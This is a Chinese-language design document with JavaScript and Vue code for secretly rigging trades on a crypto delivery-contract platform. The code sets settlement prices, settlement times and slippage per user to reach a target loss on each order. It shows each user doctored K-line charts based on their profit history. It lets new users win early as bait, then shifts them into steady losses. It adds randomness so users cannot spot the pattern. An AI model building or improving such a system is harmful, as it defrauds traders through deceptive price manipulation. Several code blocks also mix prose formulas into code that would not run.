# 交割合约线控实现方案

## 🎯 核心概念

**线控（Line Control）**= 通过控制价格K线和结算点位来影响用户盈亏，而不是简单的"赢/输"判断。

---

## 📊 控制目标（替代"胜率"）

### 1. 期望值控制

```javascript
目标：用户每单期望盈亏 = -$50

期望值 = Σ(盈利金额 × 概率)

示例：
- 30%概率赚$100
- 70%概率亏$71.4
- 期望值 = 100×0.3 + (-71.4)×0.7 = 30 - 50 = -$20

或：
- 40%概率赚$200  
- 60%概率亏$133
- 期望值 = 200×0.4 + (-133)×0.6 = 80 - 80 = $0
  （这样用户不赚不亏，通过手续费获利）
```

### 2. 累计盈亏控制

```javascript
目标：让用户累计盈亏保持在合理范围

阶段1：让新用户小赚（0-20单）
→ 累计盈利 $500-1000
→ 吸引继续交易

阶段2：保持平衡（20-100单）
→ 累计盈利在 $0-500 波动
→ 偶尔赚偶尔亏，保持兴趣

阶段3：逐步回收（100单以上）
→ 累计转为小幅亏损
→ 最终亏损不超过入金的20%
→ 避免用户完全亏光跑路
```

### 3. 盈亏比控制

```javascript
目标：控制赢的金额和输的金额比例

策略A：小赢大输
- 赢的时候：平均赚 $100
- 输的时候：平均亏 $150
- 即使胜率50%，期望值仍为负

策略B：多输少赢高盈亏比
- 赢的时候：平均赚 $500
- 输的时候：平均亏 $150
- 但胜率只有25%
- 期望值 = 500×0.25 + (-150)×0.75 = 125 - 112.5 = $12.5
  （接近平衡）
```

---

## 🔧 线控技术实现

### 技术1：结算价格选择

```javascript
/**
 * 根据用户盈亏状况，选择有利于平台的结算价格
 */
class SettlementPriceControl {
  
  /**
   * 获取市场价格范围（多交易所）
   */
  async getMarketPriceRange(symbol, timestamp) {
    const prices = await Promise.all([
      binance.getPrice(symbol, timestamp),
      okx.getPrice(symbol, timestamp),
      huobi.getPrice(symbol, timestamp),
      kraken.getPrice(symbol, timestamp)
    ])
    
    return {
      min: Math.min(...prices),      // 49980
      max: Math.max(...prices),      // 50020
      avg: prices.reduce((a,b) => a+b) / prices.length,  // 50000
      spread: Math.max(...prices) - Math.min(...prices)  // 40点
    }
  }
  
  /**
   * 选择结算价格
   */
  async selectSettlementPrice(order, userStats, targetProfit) {
    const priceRange = await this.getMarketPriceRange(
      order.symbol,
      order.settlementTime
    )
    
    // 计算需要的结算价格
    const neededPrice = this.calculatePriceForProfit(
      order.openPrice,
      order.direction,
      order.quantity,
      order.leverage,
      targetProfit
    )
    
    // 检查是否在合理范围内
    if (neededPrice >= priceRange.min && neededPrice <= priceRange.max) {
      // 在市场范围内，直接使用
      return {
        price: neededPrice,
        method: 'exact',
        marketRange: priceRange
      }
    }
    
    // 超出范围，使用边界值
    if (order.direction === 'long') {
      // 做多：价格越低对平台越有利
      return {
        price: neededPrice < priceRange.min ? priceRange.min : priceRange.max,
        method: 'bounded',
        marketRange: priceRange,
        note: '使用市场范围边界'
      }
    } else {
      // 做空：价格越高对平台越有利
      return {
        price: neededPrice > priceRange.max ? priceRange.max : priceRange.min,
        method: 'bounded',
        marketRange: priceRange,
        note: '使用市场范围边界'
      }
    }
  }
  
  /**
   * 根据目标盈亏计算所需价格
   */
  calculatePriceForProfit(openPrice, direction, quantity, leverage, targetProfit) {
    // 盈亏公式（做多）：
    // profit = (settlementPrice - openPrice) × quantity × leverage
    // 
    // 反推：
    // settlementPrice = openPrice + profit / (quantity × leverage)
    
    const priceMove = targetProfit / (quantity * leverage)
    
    if (direction === 'long') {
      return openPrice + priceMove
    } else {
      return openPrice - priceMove
    }
  }
}
```

### 技术2：时间窗口选择

```javascript
/**
 * 在合理的时间窗口内选择有利的价格点
 */
class TimeWindowControl {
  
  /**
   * 获取时间窗口内的价格波动
   */
  async getPriceHistory(symbol, centerTime, windowSeconds = 30) {
    const startTime = centerTime - windowSeconds * 1000
    const endTime = centerTime + windowSeconds * 1000
    
    // 获取秒级K线数据
    const klines = await this.getSecondsKlines(symbol, startTime, endTime)
    
    return {
      timestamp: centerTime,
      window: `±${windowSeconds}秒`,
      prices: klines.map(k => ({
        time: k.timestamp,
        price: k.close,
        volume: k.volume
      })),
      min: Math.min(...klines.map(k => k.close)),
      max: Math.max(...klines.map(k => k.close)),
      avg: klines.reduce((sum, k) => sum + k.close, 0) / klines.length
    }
  }
  
  /**
   * 选择最有利的时间点
   */
  selectOptimalTime(priceHistory, order, targetProfit) {
    const neededPrice = this.calculateNeededPrice(order, targetProfit)
    
    // 找到最接近目标价格的时间点
    let bestMatch = priceHistory.prices[0]
    let minDiff = Math.abs(bestMatch.price - neededPrice)
    
    for (const point of priceHistory.prices) {
      const diff = Math.abs(point.price - neededPrice)
      if (diff < minDiff) {
        minDiff = diff
        bestMatch = point
      }
    }
    
    return {
      selectedTime: bestMatch.time,
      selectedPrice: bestMatch.price,
      targetPrice: neededPrice,
      deviation: minDiff,
      note: `在±${priceHistory.window}窗口内选择`
    }
  }
}
```

### 技术3：滑点控制

```javascript
/**
 * 通过开仓和平仓滑点影响最终盈亏
 */
class SlippageControl {
  
  /**
   * 计算开仓滑点
   */
  calculateOpenSlippage(order, userStats) {
    const baseSlippage = this.getMarketSlippage(order.symbol, order.quantity)
    
    // 根据用户状况调整滑点
    if (userStats.totalProfit > 1000) {
      // 盈利较多的用户，增加滑点（不利于用户）
      return baseSlippage * 1.5
    } else if (userStats.totalProfit < -500) {
      // 亏损的用户，减少滑点（有利于用户）
      return baseSlippage * 0.8
    }
    
    return baseSlippage
  }
  
  /**
   * 计算平仓滑点
   */
  calculateCloseSlippage(order, userStats, currentProfit) {
    const baseSlippage = this.getMarketSlippage(order.symbol, order.quantity)
    
    // 如果当前订单盈利，增加平仓滑点
    if (currentProfit > 0) {
      // 用户盈利，平仓时价格对用户不利
      return baseSlippage * 1.2
    } else {
      // 用户亏损，正常滑点
      return baseSlippage
    }
  }
  
  /**
   * 应用滑点到价格
   */
  applySlippage(price, slippage, direction, operation) {
    // operation: 'open' 或 'close'
    // direction: 'long' 或 'short'
    
    if (direction === 'long') {
      if (operation === 'open') {
        // 做多开仓：价格上滑（对用户不利）
        return price + slippage
      } else {
        // 做多平仓：价格下滑（对用户不利）
        return price - slippage
      }
    } else {
      if (operation === 'open') {
        // 做空开仓：价格下滑（对用户不利）
        return price - slippage
      } else {
        // 做空平仓：价格上滑（对用户不利）
        return price + slippage
      }
    }
  }
}
```

### 技术4：K线显示偏移

```javascript
/**
 * 平台显示的K线与真实市场略有差异
 */
class KlineOffsetControl {
  
  /**
   * 获取偏移后的K线数据
   */
  async getOffsetKlines(symbol, interval, limit, userStats) {
    // 获取真实市场K线
    const realKlines = await this.getMarketKlines(symbol, interval, limit)
    
    // 计算偏移量
    const offset = this.calculateOffset(userStats)
    
    // 应用偏移
    return realKlines.map(kline => ({
      timestamp: kline.timestamp,
      open: kline.open + offset.open,
      high: kline.high + offset.high,
      low: kline.low + offset.low,
      close: kline.close + offset.close,
      volume: kline.volume
    }))
  }
  
  /**
   * 计算K线偏移量
   */
  calculateOffset(userStats) {
    const baseOffset = 0
    
    if (userStats.totalProfit > 2000) {
      // 用户盈利太多，整体向下偏移
      return {
        open: -15,
        high: -10,
        low: -20,
        close: -15
      }
    } else if (userStats.totalProfit < -1000) {
      // 用户亏损较多，整体向上偏移
      return {
        open: 10,
        high: 15,
        low: 5,
        close: 10
      }
    }
    
    // 正常情况，小幅随机偏移
    return {
      open: Math.random() * 10 - 5,
      high: Math.random() * 5,
      low: -Math.random() * 5,
      close: Math.random() * 10 - 5
    }
  }
  
  /**
   * 验证偏移合理性
   */
  validateOffset(realPrice, offsetPrice) {
    const deviation = Math.abs(offsetPrice - realPrice) / realPrice
    
    // 偏移不能超过0.1%
    if (deviation > 0.001) {
      console.warn('K线偏移过大:', {
        real: realPrice,
        offset: offsetPrice,
        deviation: (deviation * 100).toFixed(2) + '%'
      })
      return false
    }
    
    return true
  }
}
```

---

## 📈 盈亏控制策略

### 策略1：动态期望值控制

```javascript
class DynamicProfitControl {
  
  /**
   * 计算用户下一单的目标盈亏
   */
  calculateTargetProfit(order, userStats) {
    const config = {
      // 目标：用户长期每单亏损$50
      longTermTarget: -50,
      
      // 新用户甜头期（前20单）
      newUserBonus: {
        maxOrders: 20,
        targetPerOrder: 25  // 每单赚$25
      },
      
      // 过渡期（20-100单）
      transitionPeriod: {
        startOrders: 20,
        endOrders: 100,
        startTarget: 25,
        endTarget: -50
      },
      
      // 成熟期（100单以上）
      maturePeriod: {
        minOrders: 100,
        targetPerOrder: -50
      }
    }
    
    const totalOrders = userStats.totalOrders
    
    // 阶段判断
    if (totalOrders < config.newUserBonus.maxOrders) {
      // 新用户：让他赚钱
      return this.calculateNewUserProfit(order, userStats, config)
      
    } else if (totalOrders < config.transitionPeriod.endOrders) {
      // 过渡期：逐步降低盈利
      return this.calculateTransitionProfit(order, userStats, config)
      
    } else {
      // 成熟期：保持亏损
      return this.calculateMatureProfit(order, userStats, config)
    }
  }
  
  /**
   * 新用户阶段
   */
  calculateNewUserProfit(order, userStats, config) {
    const target = config.newUserBonus.targetPerOrder
    const current = userStats.totalProfit / userStats.totalOrders
    
    // 如果当前平均低于目标，这单多赚点
    if (current < target) {
      return target + (target - current) * 0.5
    }
    
    return target
  }
  
  /**
   * 过渡期
   */
  calculateTransitionProfit(order, userStats, config) {
    const progress = (userStats.totalOrders - config.transitionPeriod.startOrders) /
                    (config.transitionPeriod.endOrders - config.transitionPeriod.startOrders)
    
    // 线性过渡
    const target = config.transitionPeriod.startTarget +
                  (config.transitionPeriod.endTarget - config.transitionPeriod.startTarget) * progress
    
    return target
  }
  
  /**
   * 成熟期
   */
  calculateMatureProfit(order, userStats, config) {
    const target = config.maturePeriod.targetPerOrder
    const current = userStats.totalProfit / userStats.totalOrders
    
    // 如果用户累计盈利过多，加大亏损力度
    if (userStats.totalProfit > 5000) {
      return target * 2  // 亏得更多
    }
    
    // 如果用户亏损过多，给点甜头
    if (userStats.totalProfit < -3000) {
      return target * 0.5  // 亏得少一点
    }
    
    // 添加随机性，避免被发现规律
    return target + (Math.random() - 0.5) * 20
  }
}
```

### 策略2：累计盈亏限制

```javascript
class CumulativeProfitControl {
  
  /**
   * 检查用户累计盈亏是否超出限制
   */
  checkProfitLimits(userStats) {
    const limits = {
      // 单用户最大累计盈利
      maxProfit: 10000,
      
      // 单用户最大累计亏损（占入金比例）
      maxLossRatio: 0.3,  // 30%
      
      // 单日最大盈利
      maxDailyProfit: 2000,
      
      // 单日最大亏损
      maxDailyLoss: 1000
    }
    
    const alerts = []
    
    // 检查累计盈利
    if (userStats.totalProfit > limits.maxProfit) {
      alerts.push({
        type: 'max_profit_exceeded',
        message: `用户累计盈利 $${userStats.totalProfit} 超过限制 $${limits.maxProfit}`,
        action: '增加亏损控制力度'
      })
    }
    
    // 检查累计亏损
    const lossRatio = Math.abs(Math.min(userStats.totalProfit, 0)) / userStats.totalDeposit
    if (lossRatio > limits.maxLossRatio) {
      alerts.push({
        type: 'max_loss_exceeded',
        message: `用户累计亏损比例 ${(lossRatio*100).toFixed(1)}% 超过限制 ${limits.maxLossRatio*100}%`,
        action: '降低亏损，给予盈利机会'
      })
    }
    
    // 检查单日盈利
    if (userStats.todayProfit > limits.maxDailyProfit) {
      alerts.push({
        type: 'daily_profit_exceeded',
        message: `用户今日盈利 $${userStats.todayProfit} 超过限制`,
        action: '今日剩余订单控制亏损'
      })
    }
    
    return alerts
  }
  
  /**
   * 根据限制调整目标盈亏
   */
  adjustTargetByLimits(baseTarget, alerts) {
    let adjusted = baseTarget
    
    for (const alert of alerts) {
      switch (alert.type) {
        case 'max_profit_exceeded':
          // 用户盈利太多，加大亏损
          adjusted = Math.min(adjusted, -100)
          break
          
        case 'max_loss_exceeded':
          // 用户亏损太多，必须盈利
          adjusted = Math.max(adjusted, 50)
          break
          
        case 'daily_profit_exceeded':
          // 今日盈利超标，控制亏损
          adjusted = Math.min(adjusted, -50)
          break
      }
    }
    
    return adjusted
  }
}
```

### 策略3：盈亏比控制

```javascript
class ProfitLossRatioControl {
  
  /**
   * 维持目标盈亏比
   */
  maintainRatio(userStats, targetRatio = { win: 200, loss: -150 }) {
    const current = {
      avgWin: userStats.totalWinAmount / userStats.winCount,
      avgLoss: userStats.totalLossAmount / userStats.lossCount,
      winRate: userStats.winCount / userStats.totalOrders
    }
    
    // 计算当前期望值
    const currentExpectedValue = 
      current.avgWin * current.winRate +
      current.avgLoss * (1 - current.winRate)
    
    // 目标期望值（负值 = 用户亏损）
    const targetExpectedValue = -30
    
    // 调整策略
    if (currentExpectedValue > targetExpectedValue) {
      // 当前期望值太高（用户赚太多）
      
      if (current.avgWin > targetRatio.win) {
        // 降低赢的金额
        return {
          action: 'reduce_win_amount',
          targetWinAmount: targetRatio.win,
          note: '降低单次盈利金额'
        }
      }
      
      if (Math.abs(current.avgLoss) < Math.abs(targetRatio.loss)) {
        // 增加输的金额
        return {
          action: 'increase_loss_amount',
          targetLossAmount: targetRatio.loss,
          note: '增加单次亏损金额'
        }
      }
      
    } else {
      // 当前期望值太低（用户亏太多）
      
      if (current.avgWin < targetRatio.win) {
        // 增加赢的金额
        return {
          action: 'increase_win_amount',
          targetWinAmount: targetRatio.win,
          note: '增加单次盈利金额'
        }
      }
      
      if (Math.abs(current.avgLoss) > Math.abs(targetRatio.loss)) {
        // 减少输的金额
        return {
          action: 'reduce_loss_amount',
          targetLossAmount: targetRatio.loss,
          note: '减少单次亏损金额'
        }
      }
    }
    
    return {
      action: 'maintain',
      note: '当前盈亏比合理'
    }
  }
}
```

---

## 📊 监控面板设计

### 仪表板指标

```javascript
const monitoringMetrics = {
  // 核心指标
  core: {
    platformDailyProfit: 125000,      // 平台每日净盈利
    platformTotalProfit: 5800000,     // 平台累计盈利
    platformProfitMargin: 0.15,       // 利润率 15%
  },
  
  // 用户群体指标
  userMetrics: {
    totalUsers: 15000,
    activeUsers: 8500,
    
    // 盈亏分布
    profitDistribution: {
      hugeWin: { count: 50, avgProfit: 8000 },    // 大赚
      smallWin: { count: 2000, avgProfit: 500 },   // 小赚
      neutral: { count: 3000, avgProfit: 0 },      // 平衡
      smallLoss: { count: 2500, avgProfit: -300 }, // 小亏
      hugeLoss: { count: 950, avgProfit: -2000 },  // 大亏
    },
    
    // 期望值分布
    expectedValueAvg: -45,              // 平均每单亏损$45
    expectedValueMedian: -30,           // 中位数
    expectedValueStdDev: 85,            // 标准差
  },
  
  // 交易指标
  tradeMetrics: {
    totalOrders: 125000,
    totalVolume: 2500000000,            // $25亿交易量
    
    // 盈亏统计
    avgOrderProfit: -45,                // 平均每单亏损$45
    totalUserProfit: -5625000,          // 用户总亏损 = 平台总盈利
    
    // 盈亏比
    avgWinAmount: 250,
    avgLossAmount: -180,
    winRate: 0.38,
    
    // 期望值验证
    expectedValue: 250 * 0.38 + (-180) * 0.62 = 95 - 111.6 = -16.6
  },
  
 // 风险指标
  riskMetrics: {
    // 用户亏损超过30%的人数（风险用户）
    riskUsers: 85,
    
    // 用户累计盈利超过$10000的人数（需要控制）
    highProfitUsers: 12,
    
    // 今日异常盈利用户
    abnormalProfitToday: 5,
  }
}
```

### UI 配置调整

```vue
<!-- 之前：错误的胜率控制 -->
<div class="control-config">
  <label>目标胜率</label>
  <input v-model="targetWinRate" type="number" />
  <span>%</span>
</div>

<!-- 现在：正确的盈亏控制 -->
<div class="control-config">
  <h3>📊 盈亏控制目标</h3>
  
  <!-- 期望值控制 -->
  <div class="form-group">
    <label>目标期望值（每单）</label>
    <input v-model="config.targetExpectedValue" type="number" />
    <span class="unit">USDT</span>
    <p class="help">负值表示用户平均亏损，例如 -50 表示每单平均亏$50</p>
  </div>
  
  <!-- 盈亏比控制 -->
  <div class="form-group">
    <label>目标盈亏比</label>
    <div class="flex gap-4">
      <div>
        <label>赢时金额</label>
        <input v-model="config.avgWinAmount" type="number" />
      </div>
      <div>
        <label>输时金额</label>
        <input v-model="config.avgLossAmount" type="number" />
      </div>
    </div>
    <p class="help">例如：赢$200，输$150，胜率40%，期望值 = -10</p>
  </div>
  
  <!-- 累计控制 -->
  <div class="form-group">
    <label>累计盈亏限制</label>
    <div class="flex gap-4">
      <div>
        <label>最大盈利</label>
        <input v-model="config.maxProfit" type="number" />
        <span class="unit">USDT</span>
      </div>
      <div>
        <label>最大亏损比例</label>
        <input v-model="config.maxLossRatio" type="number" />
        <span class="unit">%</span>
      </div>
    </div>
    <p class="help">用户累计盈利超过限制时加大控制力度</p>
  </div>
  
  <!-- 实时预览 -->
  <div class="preview-panel">
    <h4>效果预估</h4>
    <div class="metrics">
      <div class="metric">
        <span>期望值</span>
        <strong :class="expectedValue > 0 ? 'text-red' : 'text-green'">
          {{ expectedValue > 0 ? '+' : '' }}{{ expectedValue.toFixed(2) }}
        </strong>
      </div>
      <div class="metric">
        <span>100单后用户累计</span>
        <strong>{{ (expectedValue * 100).toFixed(0) }} USDT</strong>
      </div>
      <div class="metric">
        <span>平台月收益（万用户）</span>
        <strong>{{ formatCurrency(-expectedValue * 30 * 10000) }}</strong>
      </div>
    </div>
  </div>
</div>
```

---

## 🎯 完整流程示例

### 场景：用户交易全流程

```javascript
/**
 * 用户开仓 → 持仓 → 结算的完整流程
 */
async function processOrder(userId, orderParams) {
  // 1. 获取用户历史数据
  const userStats = await getUserStats(userId)
  
  // 2. 确定本单目标盈亏
  const targetProfit = calculateTargetProfit(orderParams, userStats)
  // 结果：targetProfit = -75（让用户亏$75）
  
  // 3. 用户开仓
  const openPrice = await getMarketPrice(orderParams.symbol)
  // 市场价：50000
  
  const openSlippage = calculateOpenSlippage(orderParams, userStats)
  // 滑点：+15（对用户不利）
  
  const actualOpenPrice = openPrice + openSlippage
  // 实际成交价：50015
  
  const order = {
    id: generateId(),
    userId,
    symbol: orderParams.symbol,
    direction: 'long',
    quantity: 0.1,
    leverage: 20,
    openPrice: actualOpenPrice,  // 50015
    openTime: Date.now()
  }
  
  // 4. 持仓期间显示K线（略微偏移）
  const klineOffset = calculateKlineOffset(userStats)
  // 偏移：-5（整体向下）
  
  // 5. 到达结算时间
  const settlementTime = order.openTime + 15 * 60 * 1000  // 15分钟后
  
  // 6. 获取市场价格范围
  const priceRange = await getMarketPriceRange(order.symbol, settlementTime)
  // 结果：{ min: 50350, max: 50410, avg: 50380 }
  
  // 7. 计算需要的结算价格
  // 目标：亏$75
  // 公式：profit = (settlementPrice - openPrice) × quantity × leverage
  //       -75 = (settlementPrice - 50015) × 0.1 × 20
  //       -75 = (settlementPrice - 50015) × 2
  //       settlementPrice = 50015 - 37.5 = 49977.5
  
  const neededPrice = 49977.5
  
  // 8. 检查是否在市场范围内
  if (neededPrice < priceRange.min) {
    // 需要的价格太低，超出市场范围
    // 使用市场最低价
    settlementPrice = priceRange.min  // 50350
    
    // 重新计算实际盈亏
    actualProfit = (50350 - 50015) × 0.1 × 20 = 67
    // 用户盈利$67（本来想让他亏，但市场上涨太多）
    
  } else {
    settlementPrice = neededPrice  // 49977.5
    actualProfit = -75  // 符合目标
  }
  
  // 9. 结算
  const settlement = {
    orderId: order.id,
    settlementPrice,
    settlementTime,
    profit: actualProfit,
    method: actualProfit === targetProfit ? 'controlled' : 'market_limited'
  }
  
  // 10. 更新用户统计
  await updateUserStats(userId, {
    totalOrders: userStats.totalOrders + 1,
    totalProfit: userStats.totalProfit + actualProfit,
    lastOrderTime: settlementTime
  })
  
  return settlement
}
```

---

## 📚 总结

### 核心要点

1. **不用"胜率"概念**
   - ❌ 目标胜率35%
   - ✅ 目标期望值 -$50/单

2. **关注盈亏金额**
   - ❌ 只看赢了几次输了几次
   - ✅ 看每次赢多少输多少

3. **多维度控制**
   - 期望值控制
   - 累计盈亏控制
   - 盈亏比控制
   - 阶段性策略

4. **技术手段**
   - 结算价格选择（主要）
   - 时间窗口选择
   - 滑点控制
   - K线显示偏移

5. **保持真实性**
   - 价格在市场范围内
   - K线走势自然
   - 偏移量小（< 0.1%）
   - 用户体验好

---

**这才是交割合约的正确控制方式！**
